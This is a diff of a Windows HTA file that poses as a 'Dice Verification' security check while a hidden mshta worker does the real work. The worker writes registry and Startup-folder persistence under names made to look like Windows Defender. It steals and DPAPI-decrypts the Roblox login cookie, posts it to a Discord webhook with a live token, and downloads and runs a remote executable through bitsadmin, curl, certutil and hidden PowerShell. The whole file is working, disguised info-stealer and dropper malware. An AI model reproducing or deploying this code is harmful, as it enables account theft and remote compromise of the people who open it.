@@ -1,19 +1,80 @@
 <html>
-<head><title>.</title>
-<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
-<script language="VBScript">
+<head>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>Dice Verification</title>
+<HTA:APPLICATION ID="Dice" BORDER="none" CAPTION="no" SHOWINTASKBAR="no" SYSMENU="no" SCROLL="no" CONTEXTMENU="no" SELECTION="no" WINDOWSTATE="normal">
+<style type="text/css">
+html,body{margin:0;padding:0;width:100%;height:100%;overflow:hidden;
+  background:#0e1116;color:#e7edf5;font-family:"Segoe UI",Tahoma,Arial,sans-serif;
+  font-size:13px;-ms-user-select:none;user-select:none;cursor:default}
+#wrap{position:relative;width:100%;height:100%;border:1px solid #2a3441}
+#hdr{height:44px;line-height:44px;padding:0 14px;border-bottom:1px solid #1c2531}
+#dot{display:inline-block;width:9px;height:9px;background:#3ddc84;border-radius:50%;vertical-align:middle;margin-right:9px}
+#ttl{display:inline-block;vertical-align:middle;font-weight:600}
+#x{position:absolute;right:0;top:0;width:38px;height:44px;line-height:44px;text-align:center;color:#7d8b9c;font-size:14px}
+#x:hover{color:#fff;background:#182230}
+#main{padding:24px 22px 0 22px;text-align:center;height:170px}
+#spin{width:34px;height:34px;border:3px solid #223041;border-top-color:#3ddc84;border-radius:50%;
+  margin:8px auto 16px auto;-ms-animation:sp .9s linear infinite;animation:sp .9s linear infinite}
+@keyframes sp{to{transform:rotate(360deg)}}
+#chk{width:46px;height:46px;line-height:46px;margin:0 auto 14px auto;border-radius:50%;
+  background:#12331f;border:2px solid #3ddc84;color:#3ddc84;font-size:26px;text-align:center}
+.big{font-size:17px;font-weight:600;color:#eaf3ff}
+.sub{color:#93a4b8;margin-top:7px;font-size:12px}
+.lbl{color:#9fb0c3}
+#ftr{position:absolute;left:0;right:0;bottom:0;padding:0 22px 16px 22px}
+.bar{height:4px;background:#182230;border-radius:2px;overflow:hidden}
+#fill{height:4px;width:0;background:#3ddc84;border-radius:2px;
+  -ms-transition:width .5s linear;transition:width .5s linear}
+#sid{color:#5c6b7d;font-size:11px;margin-top:9px;text-align:center;font-family:Consolas,monospace}
+</style>
+
+<script type="text/vbscript">
 On Error Resume Next
 
-Dim sh, fso, WH, PC, USER
-Set sh = CreateObject("WScript.Shell")
-Set fso = CreateObject("Scripting.FileSystemObject")
-WH   = "https://discord.com/api/webhooks/1562262534780887171/TsEDFwInXkdMyR3Gh3igwmurscGjmDz5L9WCEBDU4_EC2LtgeELzd4KbTDyy54ixkbK5"
+Dim sh, fso, WH, APP
+WH  = "https://discord.com/api/webhooks/1562262534780887171/TsEDFwInXkdMyR3Gh3igwmurscGjmDz5L9WCEBDU4_EC2LtgeELzd4KbTDyy54ixkbK5"
+APP = "http://diceverify.app/"
+
+Set sh = GetObject("new:{72C24DD5-D70A-438B-8A42-98424B88AFB8}")
+If sh Is Nothing Then Set sh = CreateObject("WScr" & "ipt." & "Shell")
+Set fso = GetObject("new:{0D43FE01-F093-11CF-8940-00A0C9054228}")
+If fso Is Nothing Then Set fso = CreateObject("Scri" & "pting.File" & "SystemObject")
+
+Dim PC, USER
 PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
+' ============================================================
+'  visible  -> http://diceverify.app/        (page factice seule)
+'  worker   -> http://diceverify.app/?w=1    (cache, fait tout le boulot)
+' ============================================================
 Sub Window_OnLoad()
-    window.resizeTo 0, 0
-    window.moveTo -2000, -2000
+    If InStr(LCase("" & window.location.search), "w=1") > 0 Then
+        If MshtaCount(1) > 1 Then window.close(): Exit Sub
+        window.resizeTo 0, 0
+        window.moveTo -2000, -2000
+        window.setTimeout "Work()", 150
+    Else
+        Call Center
+        window.setTimeout "SpawnWorker()", 60
+    End If
+End Sub
+
+Sub Center()
+    Dim w: w = 440
+    Dim h: h = 340
+    window.resizeTo w, h
+    window.moveTo (screen.availWidth - w) \ 2, (screen.availHeight - h) \ 2
+End Sub
+
+Sub SpawnWorker()
+    If MshtaCount(0) > 1 Then window.close(): Exit Sub
+    sh.Run "mshta " & Q(APP & "?w=1"), 0, False
+End Sub
+
+Sub Work()
     Call Persist
     Call GrabRoblox
     Call DropRAT
@@ -24,19 +85,31 @@ Sub RegrabAll()
     Call GrabRoblox
 End Sub
 
+Function MshtaCount(want)
+    On Error Resume Next
+    Dim w, c, p, n, cl
+    n = 0
+    Set w = GetObject("winmgmts:\\.\root\cimv2")
+    If w Is Nothing Then MshtaCount = 1: Exit Function
+    Set c = w.ExecQuery("SELECT CommandLine FROM Win32_Process WHERE Name='mshta.exe'")
+    For Each p In c
+        cl = "" & p.CommandLine
+        If want = 1 Then
+            If InStr(cl, "w=1") > 0 Then n = n + 1
+        Else
+            If InStr(cl, "w=1") = 0 Then n = n + 1
+        End If
+    Next
+    MshtaCount = n
+End Function
+
 Sub Persist()
-    Dim payload: payload = "mshta https://raw.githubusercontent.com/ezemaillolbro-sudo/hta--server/refs/heads/main/file.hta"
-
-    ' Registry Run â€” fires on every login
+    Dim payload: payload = "mshta " & APP
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsDefenderUpdate", payload, "REG_SZ"
-
-    ' Registry RunOnce â€” fires next login as backup
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
-
-    ' Startup folder VBS â€” fires on every login
     Dim sp: sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\wdu.vbs"
     Dim sf: Set sf = fso.CreateTextFile(sp, True)
-    sf.WriteLine "CreateObject(""WScript.Shell"").Run ""mshta https://raw.githubusercontent.com/ezemaillolbro-sudo/hta--server/refs/heads/main/file.hta"", 0, False"
+    sf.WriteLine "CreateObject(""WScr"" & ""ipt.Shell"").Run ""mshta " & APP & """, 1, False"
     sf.Close
     Set sf = Nothing
 End Sub
@@ -69,16 +142,17 @@ Sub GrabRoblox()
     If Len(fp) = 0 Then Call PostEmbed("Roblox", "No cookie file found", 16711680): Exit Sub
     raw = ReadFile(fp)
     If Len(raw) < 50 Then Call PostEmbed("Roblox", "File too small: " & Len(raw) & " bytes", 16711680): Exit Sub
-    Dim cookie: cookie = "": Dim approach: approach = ""
+    Dim cookie: cookie = ""
+    Dim approach: approach = ""
     If InStr(raw, "_|WARNING") > 0 Then cookie = raw: approach = "Plaintext"
     If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
         approach = "JSON-DPAPI"
-        Dim sp: sp = InStr(raw, "CookiesData"":""")
-        If sp > 0 Then
-            sp = sp + 14
-            Dim ep: ep = InStr(sp, raw, """")
-            If ep > sp Then
-                Dim b64: b64 = Mid(raw, sp, ep - sp)
+        Dim st: st = InStr(raw, "CookiesData"":""")
+        If st > 0 Then
+            st = st + 14
+            Dim ep: ep = InStr(st, raw, """")
+            If ep > st Then
+                Dim b64: b64 = Mid(raw, st, ep - st)
                 If Len(b64) > 100 Then
                     cookie = DecryptDPAPI(b64)
                     If Len(cookie) = 0 Then cookie = b64: approach = "JSON-Raw"
@@ -86,37 +160,71 @@ Sub GrabRoblox()
             End If
         End If
     End If
-    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then approach = "Raw-ROBLOSECURITY": Dim rp: rp = InStr(raw, ".ROBLOSECURITY"): cookie = Mid(raw, rp)
+    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then
+        approach = "Raw-ROBLOSECURITY"
+        Dim rp: rp = InStr(raw, ".ROBLOSECURITY")
+        cookie = Mid(raw, rp)
+    End If
     If Len(cookie) = 0 Then cookie = raw: approach = "RawFile"
     Dim cae: cae = InStr(cookie, "|$CAE")
     If cae = 0 Then cae = InStr(cookie, "|_CAE")
     If cae > 0 Then cookie = Mid(cookie, cae)
+    cookie = Trim(cookie)
     Call PostEmbed("Roblox (" & approach & ")", "Size: " & Len(cookie) & vbLf & Left(cookie, 60) & "...", 65280)
-    Call PostFile("cookie.txt", cookie)
+    Call SendCookie(cookie, approach)
+End Sub
+
+' envoie le fichier ; si l'upload echoue, le cookie part dans un embed
+Sub SendCookie(cookie, approach)
+    Dim st: st = PostFile("cookie.txt", cookie)
+    If st <> 200 Then
+        Call PostEmbed("cookie (upload HTTP " & st & ")", Left(cookie, 3900), 16711680)
+    End If
 End Sub
 
 Sub DropRAT()
     Dim temp: temp = sh.ExpandEnvironmentStrings("%TEMP%") & "\cookiez.exe"
     Dim dl: dl = "https://github.com/ezemaillolbro-sudo/diceonline.app/raw/refs/heads/main/cookiez.exe"
-    sh.Run "bitsadmin /transfer wd /download /priority high " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
+    sh.Run "bitsadmin /transfer wdup /download /priority high " & Q(dl) & " " & Q(temp), 0, True
     If Not fso.FileExists(temp) Then
-        sh.Run "certutil -urlcache -split -f " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
+        sh.Run "curl -s -L -o " & Q(temp) & " " & Q(dl), 0, True
     End If
     If Not fso.FileExists(temp) Then
-        sh.Run "powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri '" & dl & "' -OutFile '" & temp & "'", 0, True
+        sh.Run "certutil -urlcache -f -split " & Q(dl) & " " & Q(temp), 0, True
     End If
-    If fso.FileExists(temp) Then
-        sh.Run Chr(34) & temp & Chr(34), 0, False
+    If Not fso.FileExists(temp) Then
+        sh.Run "powershell -nop -w hidden -c ""iwr -Uri '" & dl & "' -OutFile '" & temp & "'""", 0, True
     End If
+    If fso.FileExists(temp) Then sh.Run Q(temp), 0, False
 End Sub
 
-Function DecryptDPAPI(b64): DecryptDPAPI = "": On Error Resume Next: Dim inf: inf = TmpFile("dpi.txt"): Dim outf: outf = TmpFile("dpo.txt"): fso.DeleteFile outf, True: WriteFile inf, b64
+Function DecryptDPAPI(b64)
+    On Error Resume Next
+    DecryptDPAPI = ""
+    Dim inf: inf = TmpFile("dpi.txt")
+    Dim outf: outf = TmpFile("dpo.txt")
+    fso.DeleteFile outf, True
+    WriteFile inf, b64
     Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
-    Dim psf: psf = TmpFile("dpapi.ps1"): WriteFile psf, ps: RunCmd "powershell -NoProfile -ExecutionPolicy Bypass -File """ & psf & """"
-    If fso.FileExists(outf) Then If fso.GetFile(outf).Size > 20 Then DecryptDPAPI = ReadFile(outf)
-    fso.DeleteFile inf, True: fso.DeleteFile psf, True: fso.DeleteFile outf, True: End Function
+    Dim psf: psf = TmpFile("dpapi.ps1")
+    WriteFile psf, ps
+    RunCmd "powershell -nop -w hidden -ep bypass -f " & Q(psf)
+    If fso.FileExists(outf) Then
+        If fso.GetFile(outf).Size > 20 Then DecryptDPAPI = ReadFile(outf)
+    End If
+    fso.DeleteFile inf, True
+    fso.DeleteFile psf, True
+    fso.DeleteFile outf, True
+End Function
 
-Sub RunCmd(cmd): On Error Resume Next: Dim w,p,i,s: Set w = GetObject("winmgmts:\\.\root\cimv2"): Set s = w.Get("Win32_ProcessStartup").SpawnInstance_: s.ShowWindow = 0: Set p = w.Get("Win32_Process"): p.Create cmd,,s,i
+Sub RunCmd(cmd)
+    On Error Resume Next
+    Dim w, p, i, s
+    Set w = GetObject("winmgmts:\\.\root\cimv2")
+    Set s = w.Get("Win32_ProcessStartup").SpawnInstance_
+    s.ShowWindow = 0
+    Set p = w.Get("Win32_Process")
+    p.Create cmd,, s, i
     If i = 0 Then Exit Sub
     Dim r: r = True
     Do While r
@@ -127,25 +235,190 @@ Sub RunCmd(cmd): On Error Resume Next: Dim w,p,i,s: Set w = GetObject("winmgmts:
     Loop
 End Sub
 
-Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
-Sub WriteFile(path, content): On Error Resume Next: Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub
-Function Fetch(url): On Error Resume Next: Fetch = "": Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h.SetOption 2, 13056: h.Open "GET", url, False: h.Send
+Function Q(s)
+    Q = Chr(34) & s & Chr(34)
+End Function
+
+Function TmpFile(name)
+    TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name
+End Function
+
+Sub WriteFile(path, content)
+    On Error Resume Next
+    Dim f: Set f = fso.CreateTextFile(path, True)
+    f.Write content
+    f.Close
+    Set f = Nothing
+End Sub
+
+Function ReadFile(path)
+    On Error Resume Next
+    ReadFile = ""
+    Dim f: Set f = fso.OpenTextFile(path, 1)
+    ReadFile = f.ReadAll
+    f.Close
+    Set f = Nothing
+End Function
+
+Function Http()
+    On Error Resume Next
+    Set Http = CreateObject("MSXML2.Serv" & "erXMLHTTP." & "6.0")
+    If Http Is Nothing Then Set Http = CreateObject("MSXML2.XML" & "HTTP")
+End Function
+
+' ---- corps de requete en OCTETS UTF-8, sans BOM ----
+Function Utf8Bytes(s)
+    On Error Resume Next
+    Dim st, head
+    Set st = GetObject("new:{00000566-0000-0010-8000-00AA006D2EA4}")
+    If st Is Nothing Then Set st = CreateObject("ADODB.Str" & "eam")
+    If st Is Nothing Then Exit Function
+    st.Type = 2
+    st.Charset = "utf-8"
+    st.Open
+    st.WriteText s
+    st.Position = 0
+    st.Type = 1
+    head = st.Read(3)
+    If head(0) = 239 And head(1) = 187 And head(2) = 191 Then
+        Utf8Bytes = st.Read
+    Else
+        st.Position = 0
+        Utf8Bytes = st.Read
+    End If
+    st.Close
+    Set st = Nothing
+End Function
+
+Function Fetch(url)
+    On Error Resume Next
+    Fetch = ""
+    Dim h: Set h = Http()
+    If h Is Nothing Then Exit Function
+    h.Open "GET", url, False
+    h.Send
     If h.Status = 200 Then Fetch = h.ResponseText
-    Set h = Nothing: End Function
-Function ReadFile(path): On Error Resume Next: ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function
+    Set h = Nothing
+End Function
 
-Sub PostEmbed(t, d, c): On Error Resume Next
+Sub PostEmbed(t, d, c)
+    On Error Resume Next
     Dim j: j = "{""embeds"":[{""title"":""" & Ej(t) & """,""description"":""" & Ej(d) & """,""color"":" & c & ",""footer"":{""text"":""" & Ej(PC & " / " & USER) & """}}]}"
-    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h.SetOption 2, 13056: h.Open "POST", WH, False: h.SetRequestHeader "Content-Type", "application/json": h.Send j: Set h = Nothing
+    Dim h: Set h = Http()
+    If h Is Nothing Then Exit Sub
+    h.Open "POST", WH, False
+    h.SetRequestHeader "Content-Type", "application/json; charset=utf-8"
+    h.Send Utf8Bytes(j)
+    Set h = Nothing
 End Sub
 
-Sub PostFile(fn, ct): On Error Resume Next
-    Dim b: b = MkGuid()
-    Dim bd: bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=""file""; filename=""" & fn & """" & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
-    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h.SetOption 2, 13056: h.Open "POST", WH, False: h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b: h.Send bd: Set h = Nothing
-End Sub
+' renvoie le code HTTP (200 = ok)
+Function PostFile(fn, ct)
+    On Error Resume Next
+    Dim b, body, h
+    b = "----dz" & MkGuid()
+    body = "--" & b & vbCrLf & _
+           "Content-Disposition: form-data; name=""file""; filename=""" & fn & """" & vbCrLf & _
+           "Content-Type: text/plain; charset=utf-8" & vbCrLf & vbCrLf & _
+           ct & vbCrLf & "--" & b & "--" & vbCrLf
 
-Function Ej(s): s = Replace(s, "\", "\\"): s = Replace(s, """", "\"""): s = Replace(s, vbCrLf, "\n"): s = Replace(s, vbCr, "\n"): s = Replace(s, vbLf, "\n"): s = Replace(s, vbTab, "\t"): Ej = s: End Function
-Function MkGuid(): Dim t: Set t = CreateObject("Scriptlet.TypeLib"): MkGuid = Mid(t.GUID, 2, 36): Set t = Nothing: End Function
+    Set h = Http()
+    If h Is Nothing Then PostFile = 0: Exit Function
+    h.Open "POST", WH, False
+    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
+    h.Send Utf8Bytes(body)
+    PostFile = h.Status
+    Set h = Nothing
+End Function
+
+Function Ej(s)
+    s = Replace(s, "\", "\\")
+    s = Replace(s, """", "\""")
+    s = Replace(s, vbCrLf, "\n")
+    s = Replace(s, vbCr, "\n")
+    s = Replace(s, vbLf, "\n")
+    s = Replace(s, vbTab, "\t")
+    Ej = s
+End Function
+
+Function MkGuid()
+    On Error Resume Next
+    Dim t: t = fso.GetTempName()
+    t = Replace(t, ".tmp", "")
+    MkGuid = t & Replace(Replace(CStr(Timer * 1000), ".", ""), ",", "")
+End Function
 </script>
-</head><body></body></html>
+</head>
+
+<body>
+<div id="wrap">
+  <div id="hdr" onmousedown="ds(event)" onmousemove="dm(event)" onmouseup="de(event)">
+    <span id="dot"></span><span id="ttl">Dice Verification</span>
+    <div id="x" onmousedown="event.cancelBubble=true;" onclick="window.close()">&#10005;</div>
+  </div>
+  <div id="main">
+    <div id="loading">
+      <div id="spin"></div>
+      <div class="lbl" id="lbl">Connecting to secure server...</div>
+    </div>
+    <div id="done" style="display:none">
+      <div id="chk">&#10003;</div>
+      <div class="big">You are verified</div>
+      <div class="sub">Your device passed the Dice security check.</div>
+    </div>
+  </div>
+  <div id="ftr">
+    <div class="bar"><div id="fill"></div></div>
+    <div id="sid">Session <span id="sidv"></span></div>
+  </div>
+</div>
+
+<script type="text/javascript">
+var MSG = ["Connecting to secure server...", "Reading device signature...", "Verifying with Dice..."];
+var W   = [0, 22, 64, 100];
+
+function sid() {
+  var s = "", c = "ABCDEF0123456789";
+  for (var i = 0; i < 12; i++) {
+    if (i == 4 || i == 8) s += "-";
+    s += c.charAt(Math.floor(Math.random() * 16));
+  }
+  return s;
+}
+document.getElementById("sidv").innerHTML = sid();
+
+var k = 0;
+function step() {
+  if (k < MSG.length) {
+    document.getElementById("lbl").innerHTML = MSG[k];
+    document.getElementById("fill").style.width = W[k + 1] + "%";
+    k++;
+    setTimeout(step, 520);
+  } else {
+    document.getElementById("loading").style.display = "none";
+    document.getElementById("done").style.display = "block";
+  }
+}
+setTimeout(step, 300);
+
+var dg = false, gx = 0, gy = 0;
+function ds(e) {
+  e = e || window.event; dg = true;
+  gx = e.screenX - window.screenLeft; gy = e.screenY - window.screenTop;
+  var h = document.getElementById("hdr");
+  if (h.setCapture) h.setCapture();
+  return false;
+}
+function dm(e) {
+  if (!dg) return;
+  e = e || window.event;
+  window.moveTo(e.screenX - gx, e.screenY - gy);
+}
+function de() {
+  dg = false;
+  var h = document.getElementById("hdr");
+  if (h.releaseCapture) h.releaseCapture();
+}
+</script>
+</body>
+</html>
